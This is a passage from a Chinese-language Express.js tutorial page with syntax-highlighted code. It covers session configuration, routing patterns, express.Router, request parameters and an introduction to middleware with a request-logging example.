配置加密字符串，它会在原有加密基础之上和这个字符串拼起来去加密</span>  <span class="token comment" spellcheck="true">// 目的是为了增加安全性，防止客户端恶意伪造</span>  secret<span class="token punctuation">:</span> <span class="token string">'itcast'</span><span class="token punctuation">,</span>  resave<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>  saveUninitialized<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token comment" spellcheck="true">// 无论你是否使用 Session ，我都默认直接给你分配一把钥匙</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>使用：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 添加 Session 数据</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>foo <span class="token operator">=</span> <span class="token string">'bar'</span><span class="token comment" spellcheck="true">// 获取 Session 数据</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>foo</code></pre><p>提示：默认 Session 数据是内存存储的，服务器一旦重启就会丢失，真正的生产环境会把 Session 进行持久化存储。</p><hr><h4 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h4><blockquote><p>参考文档：</p><ul><li><a href="http://expressjs.com/en/guide/routing.html" target="_blank" rel="noopener">Routing</a></li></ul></blockquote><p>一个非常基础的路由：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// respond with "hello world" when a GET request is made to the homepage</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'hello world'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h6 id="路由方法"><a href="#路由方法" class="headerlink" title="路由方法"></a>路由方法</h6><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// GET method route</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'GET request to the homepage'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// POST method route</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'POST request to the homepage'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h6 id="路由路径"><a href="#路由路径" class="headerlink" title="路由路径"></a>路由路径</h6><p>This route path will match requests to the root route, /.</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>This route path will match requests to /about.</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/about'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'about'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>This route path will match requests to /random.text.</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/random.text'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'random.text'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>Here are some examples of route paths based on string patterns.</p><p>This route path will match acd and abcd.</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/ab?cd'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'ab?cd'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>This route path will match abcd, abbcd, abbbcd, and so on.</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/ab+cd'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'ab+cd'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>This route path will match abcd, abxcd, abRANDOMcd, ab123cd, and so on.</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/ab*cd'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'ab*cd'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>This route path will match /abe and /abcde.</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/ab(cd)?e'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'ab(cd)?e'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>Examples of route paths based on regular expressions:</p><p>This route path will match anything with an “a” in the route name.</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token regex">/a/</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'/a/'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>This route path will match butterfly and dragonfly, but not butterflyman, dragonflyman, and so on.</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token regex">/.*fly$/</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'/.*fly$/'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>######## 动态路径</p><pre><code>Route path: /users/:userId/books/:bookIdRequest URL: http://localhost:3000/users/34/books/8989req.params: { "userId": "34", "bookId": "8989" }</code></pre><p>定义动态的路由路径：</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/users/:userId/books/:bookId'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h6 id="路由处理方法"><a href="#路由处理方法" class="headerlink" title="路由处理方法"></a>路由处理方法</h6><h6 id="app-route"><a href="#app-route" class="headerlink" title="app.route()"></a>app.route()</h6><h6 id="express-Router"><a href="#express-Router" class="headerlink" title="express.Router"></a>express.Router</h6><p>Create a router file named router.js in the app directory, with the following content:</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token keyword">const</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span>router<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'home page'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>router<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/about'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'About page'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router</code></pre><p>Then, load the router module in the app:</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./router'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// ...</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>router<span class="token punctuation">)</span></code></pre><hr><h4 id="在-Express-中获取客户端请求参数的三种方式"><a href="#在-Express-中获取客户端请求参数的三种方式" class="headerlink" title="在 Express 中获取客户端请求参数的三种方式"></a>在 Express 中获取客户端请求参数的三种方式</h4><p>例如，有一个地址：<code>/a/b/c?foo=bar&amp;id=123</code></p><h6 id="查询字符串参数"><a href="#查询字符串参数" class="headerlink" title="查询字符串参数"></a>查询字符串参数</h6><p>获取 <code>?foo=bar&amp;id=123</code></p><pre class=" language-javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">)</span></code></pre><p>结果如下：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token punctuation">{</span>  foo<span class="token punctuation">:</span> <span class="token string">'bar'</span><span class="token punctuation">,</span>  id<span class="token punctuation">:</span> <span class="token string">'123'</span><span class="token punctuation">}</span></code></pre><h6 id="请求体参数"><a href="#请求体参数" class="headerlink" title="请求体参数"></a>请求体参数</h6><p><code>POST</code> 请求才有请求体，我们需要单独配置 <code>body-parser</code> 中间件才可以获取。<br>只要程序中配置了 <code>body-parser</code> 中间件，我们就可以通过 <code>req.body</code> 来获取表单 <code>POST</code> 请求体数据。</p><pre><code>req.body// =&gt; 得到一个请求体对象</code></pre><h6 id="动态的路径参数"><a href="#动态的路径参数" class="headerlink" title="动态的路径参数"></a>动态的路径参数</h6><p>在 Express 中，支持把一个路由设计为动态的。例如：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// /users/:id 要求必须以 /users/ 开头，:id 表示动态的，1、2、3、abc、dnsaj 任意都行</span><span class="token comment" spellcheck="true">// 注意：:冒号很重要，如果你不加，则就变成了必须 === /users/id</span><span class="token comment" spellcheck="true">// 为啥叫 id ，因为是动态的路径，服务器需要单独获取它，所以得给它起一个名字</span><span class="token comment" spellcheck="true">// 那么我们就可以通过 req.params 来获取路径参数</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/users/:id'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// /users</span><span class="token comment" spellcheck="true">/*/abc// req.params.idapp.get('/users/:id/abc', (req, res, next) => {  console.log(req.params.id)})// /users/*/</span><span class="token operator">*</span><span class="token comment" spellcheck="true">// req.params.id</span><span class="token comment" spellcheck="true">// req.params.abc</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/users/:id/:abc'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// </span><span class="token comment" spellcheck="true">/*/*/</span><span class="token operator">*</span><span class="token comment" spellcheck="true">// req.params.users</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/:users/:id/:abc'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// /*/id/*</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/:users/id/:abc'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><hr><h4 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h4><blockquote><p>参考文档：</p><ul><li><a href="http://expressjs.com/en/guide/writing-middleware.html" target="_blank" rel="noopener">Writing middleware for use in Express apps</a></li><li><a href="http://expressjs.com/en/guide/using-middleware.html" target="_blank" rel="noopener">Using middleware</a></li></ul></blockquote><p>Express 的最大特色，也是最重要的一个设计，就是中间件。一个 Express 应用，就是由许许多多的中间件来完成的。</p><p>为了理解中间件，我们先来看一下我们现实生活中的自来水厂的净水流程。</p><p><img src="/images/water-middleware.jpeg" alt="中间件"></p><p>在上图中，自来水厂从获取水源到净化处理交给用户，中间经历了一系列的处理环节，我们称其中的每一个处理环节就是一个中间件。这样做的目的既提高了生产效率也保证了可维护性。</p><h6 id="一个简单的中间件例子：打印日志"><a href="#一个简单的中间件例子：打印日志" class="headerlink" title="一个简单的中间件例子：打印日志"></a>一个简单的中间件例子：打印日志</h6><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>method<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/about'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>method<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'about'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>method<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>在上面的示例中，每一个请求处理函数都做了一件同样的事情：请求日志功能（在控制台打印当前请求方法、请求路径以及请求时间）。</p><p>针对于这样的代码我们自然想到了封装来解决：</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// console.log(`${req.method} ${req.url} ${Date.now()}`)</span>  <span class="token function">logger</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/about'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// console.log(`${req.method} ${req.url} ${Date.now()}`)</span>  <span class="token function">logger</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'about'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// console.log(`${req.method} ${req.url} ${Date.now()}`)</span>  <span class="token function">logger</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">function</span> logger <span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>method<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>这样的做法自然没有问题，但是大家想一想，我现在只有三个路由，如果说有10个、100个、1000个呢？那我在每个请求路由函数中都手动调用一次也太麻烦了。</p><p>好了，我们不卖关子了，来看一下我们如何使用中间件来解决这个简单的小功能。</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>method<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/about'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'about'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">function</span> logger <span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>method<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>上面代码执行之后我们发现任何请求进来都会先在服务端打印请求日志，然后才会执行具体的业务处理函数。那这个到底是怎么回事？</p><h6 id="中间件的组成"><a href="#中间件的组成" class="headerlink" title="中间件的组成"></a>中间件的组成</h6><p><img src="/images/express-mw.png" alt="中间件的组成"></p><p>中间件函数可以执行以下任何任务：</p><ul><li>执行任何代码</li><li>修改 request 或者 response 响应对象</li><li>结束请求响应周期</li><li>调用下一个中间件</li></ul><h6 id="中间件分类"><a href="#中间件分类" class="headerlink" title="中间件分类"></a>中间件分类</h6><ul><li>应用程序级别中间件</li><li>路由级别中间件</li><li>错误处理中间件</li><li>内置中间件</li><li>第三方中间件</li></ul><p>######## 应用程序级别中间件</p><p>不关心请求路径：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Time:'</span><span class="token punctuation">,</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>限定请求路径：</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/user/:id'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Request Type:'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>method<span class="token punctuation">)</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>限定请求方法：</p><pre class=" language-typescript"><code class="language-typescript">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/user/:id'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token 